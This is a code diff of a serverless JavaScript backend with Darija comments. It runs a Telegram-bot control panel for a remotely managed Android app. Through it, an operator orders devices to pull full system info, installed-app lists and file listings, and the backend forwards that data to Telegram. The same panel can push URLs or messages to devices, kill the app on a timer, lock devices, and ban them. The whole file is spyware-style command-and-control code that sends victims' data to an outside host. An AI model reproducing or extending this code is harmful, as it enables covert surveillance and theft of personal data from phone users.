@@ -16,13 +16,11 @@ async function kvCmd(...args) {
   } catch (e) { return null; }
 }
 
-let appLockStatus = "lock";
-let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
-let bannedDevices = [];
-let banAllActive = false;
-let remoteCommand = "";
+let activeDevice = "";
+let keyExpiryTime = 0;
 let totalAttempts = 0;
 let recentLogs = [];
+let remoteCommand = "";
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -31,68 +29,58 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   const type = req.query.type;
+  const deviceId = req.query.device_id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
     if (TELEGRAM_TOKEN && chatId) {
-      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
-      if (keyboard) payload.reply_markup = keyboard;
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
-      }).catch(() => {});
+      const maxLength = 4000;
+      if (text.length > maxLength) {
+        for (let i = 0; i < text.length; i += maxLength) {
+           const chunk = text.substring(i, i + maxLength);
+           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+             body: JSON.stringify({ chat_id: chatId, text: chunk })
+           }).catch(() => {});
+        }
+      } else {
+        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
+        if (keyboard) payload.reply_markup = keyboard;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
+        }).catch(() => {});
+      }
     }
   };
 
   try {
-    // 1. المفتاح الوحيد (Authentication)
-    if (type === 'auth') {
-      const userKey = req.query.key;
-      const deviceId = req.query.device_id;
-      if (!userKey || !deviceId) return res.status(400).send('"No Key or ID"');
-      
-      const isValid = await kvCmd('SISMEMBER', 'valid_keys', userKey);
-      if (isValid === 1) {
-        await kvCmd('SREM', 'valid_keys', userKey); // يتحيد المفتاح (مرة وحدة)
-        await kvCmd('SET', `unlock_time_${deviceId}`, Date.now().toString());
-        return res.status(200).send('"success"');
-      } else {
-        return res.status(200).send('"failed"');
-      }
-    }
-
-    // 2. فحص الوقت (Secret)
     if (type === 'secret') {
-      const deviceId = req.query.device_id;
-      if (deviceId) {
-        const unlockTimeStr = await kvCmd('GET', `unlock_time_${deviceId}`);
-        if (unlockTimeStr) {
-          const validity = parseFloat(await kvCmd('GET', 'key_validity_hours')) || 1;
-          const elapsed = Date.now() - parseInt(unlockTimeStr);
-          
-          if (elapsed > validity * 3600000) {
-            await kvCmd('DEL', `unlock_time_${deviceId}`);
-            return res.status(200).send('"killapp"'); // الوقت سلا، كنقتلو التطبيق
-          }
-          return res.status(200).send('"unlock"');
-        }
-      }
-      return res.status(200).send(`"${appLockStatus}"`);
+      const saved = await kvCmd('GET', 'app_lock_status');
+      return res.status(200).send(`"${saved || 'lock'}"`);
     }
-
-    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);
+    if (type === 'key') {
+      const saved = await kvCmd('GET', 'app_secret_key');
+      return res.status(200).send(`"${saved || '1234'}"`);
+    }
+    if (type === 'message') return res.status(200).send(`"التطبيق مقفول من طرف الإدارة."`);
 
     if (type === 'banned') {
       const all = await kvCmd('GET', 'banall_active');
-      if (all === '1') banAllActive = true;
-      if (banAllActive) return res.status(200).send('"true"');
-      const deviceId = req.query.device_id;
+      if (all === '1') return res.status(200).send('"true"');
       if (!deviceId) return res.status(400).send('"No Device ID"');
       const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
-      if (inKv === 1) return res.status(200).send('"true"');
-      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
+      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
     }
 
     if (type === 'command') {
+      // فحص الوقت
+      if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
+        if (Date.now() > keyExpiryTime) {
+          // الوقت انتهى، قفل التطبيق
+          return res.status(200).send('"killapp:1"');
+        }
+      }
+      
       const cmd = remoteCommand;
       remoteCommand = ""; 
       return res.status(200).send(`"${cmd}"`);
@@ -104,21 +92,42 @@ export default async function handler(req, res) {
       return new Promise((resolve) => {
         req.on('end', async () => {
           const cleanBody = body.replace(/"/g, '');
+          if (type === 'key') {
+            await kvCmd('SET', 'app_secret_key', cleanBody);
+            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
+          }
           if (type === 'log') {
             totalAttempts++;
             recentLogs.unshift(`📱 ${cleanBody}`);
             if (recentLogs.length > 50) recentLogs.pop();
             await kvCmd('INCR', 'total_attempts');
             await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
+            
+            if (cleanBody.includes('success')) {
+              const match = cleanBody.match(/Device:\s*([a-zA-Z0-9]+)/);
+              const devId = match ? match[1] : null;
+              const isSingleUse = await kvCmd('GET', 'is_single_use');
+              
+              if (devId && isSingleUse === '1') {
+                  activeDevice = devId;
+                  const duration = parseInt(await kvCmd('GET', 'key_duration') || "0");
+                  if (duration > 0) {
+                      keyExpiryTime = Date.now() + (duration * 60000);
+                  }
+                  await kvCmd('SET', 'app_secret_key', 'EXPIRED_KEY');
+                  await kvCmd('SET', 'is_single_use', '0');
+                  await sendToTelegram(`⏱️ *المفتاح استعمل!*\nالجهاز: \`${devId}\`\nغادي يتقفل التطبيق بعد \`${duration}\` دقيقة.`);
+              }
+            }
           }
           if (type === 'sysinfo') {
-             await sendToTelegram(`💻 *معلومات:*\n${cleanBody}`);
+            await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
           }
           if (type === 'applist') {
-             await sendToTelegram(`📱 *التطبيقات:*\n${cleanBody}`);
+             await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
           }
           if (type === 'files') {
-             await sendToTelegram(`📁 *الملفات:*\n${cleanBody}`);
+             await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
           }
           res.status(200).send('"success"');
           resolve();
@@ -138,50 +147,68 @@ export default async function handler(req, res) {
       const args = text.trim().split(/\s+/);
       const command = args[0].toLowerCase();
 
-      const mainKeyboard = {
-        inline_keyboard: [
-          [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
-          [{ text: "🔑 توليد مفتاح", callback_data: "/genkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
-          [{ text: "📱 معلومات", callback_data: "/fullinfo" }, { text: "📦 التطبيقات", callback_data: "/applist" }],
-          [{ text: "📁 الملفات", callback_data: "/files" }, { text: "💀 إغلاق التطبيق", callback_data: "/killapp" }]
-        ]
-      };
-
-      if (text === '/start' || text === '/menu') {
-        await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nاختر من القائمة.", mainKeyboard);
-        return res.status(200).end();
-      }
-
       switch (command) {
+        case '/start': case '/menu': 
+          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
+          break;
         case '/help': 
-          await sendToTelegram(`👑 *الأوامر:*\n/settime [ساعات] - تحديد وقت المفتاح\n/genkey - توليد مفتاح مرة وحدة\n/killapp /fullinfo /applist /files /lock /unlock`); 
+          await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
+            `⚡ *الأوامر الحقيقية:*\n` +
+            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
+            `⏱️ *التحكم بالوقت:*\n` +
+            `/gentime <minutes> - إنشاء مفتاح بوقت محدد ويستخدم مرة واحدة\n` +
+            `/settime <minutes> - تحديد وقت للمفتاح الحالي\n\n` +
+            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
+            `💬 *الأوامر الفنية:*\n` +
+            `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /ignite /shadow`); 
           break;
         
-        case '/settime':
-          if (args[1]) {
-            await kvCmd('SET', 'key_validity_hours', args[1].toString());
-            await sendToTelegram(`⏱️ *تم تحديد وقت المفتاح:* \`${args[1]}\` ساعات.`);
-          } else {
-            await sendToTelegram("⚠️ `/settime 2`");
-          }
-          break;
-
-        case '/genkey':
-          const newK = Math.random().toString(36).substring(2, 8).toUpperCase();
-          await kvCmd('SADD', 'valid_keys', newK);
-          const vH = await kvCmd('GET', 'key_validity_hours') || 1;
-          await sendToTelegram(`🎲 *مفتاح جديد (مرة وحدة):* \`${newK}\`\n⏱️ *صالح لـ:* \`${vH}\` ساعات.`);
+        case '/gentime':
+          if(args[1]) {
+            const minutes = parseInt(args[1]);
+            const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
+            await kvCmd('SET', 'app_secret_key', newKey);
+            await kvCmd('SET', 'key_duration', minutes);
+            await kvCmd('SET', 'is_single_use', '1');
+            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\nملاحظة: كيتقفل التطبيق أوتوماتيكياً ملي تنقضي المدة.`);
+          } else await sendToTelegram("⚠️ استعمل: `/gentime 60` (لمدة 60 دقيقة)");
           break;
           
-        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 *إغلاق التطبيق...*"); break;
-        case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ *جاري سحب المعلومات...*"); break;
-        case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ *جاري سحب التطبيقات...*"); break;
-        case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ *جاري سحب الملفات...*"); break;
-        
-        case '/lock': appLockStatus = 'lock'; await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 *تم القفل.*"); break;
-        case '/unlock': appLockStatus = 'unlock'; await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 *تم الفتح.*"); break;
-        
-        default: await sendToTelegram("❓ أمر غير معروف.");
+        case '/settime':
+          if(args[1]) {
+            const minutes = parseInt(args[1]);
+            await kvCmd('SET', 'key_duration', minutes);
+            await kvCmd('SET', 'is_single_use', '1');
+            await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
+          } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
+          break;
+
+        case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
+        case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
+        case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
+        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
+        case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
+        case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
+        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
+        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
+        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
+        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
+        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
+        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
+        case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "1234"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
+        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
+        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
+        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
+        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
+        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
+        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
+        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
+        default:
+          if (command.startsWith('/')) {
+            await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
+          } else {
+            await sendToTelegram("❓ أمر غير معروف. كتب /help");
+          }
       }
       return res.status(200).end();
     }
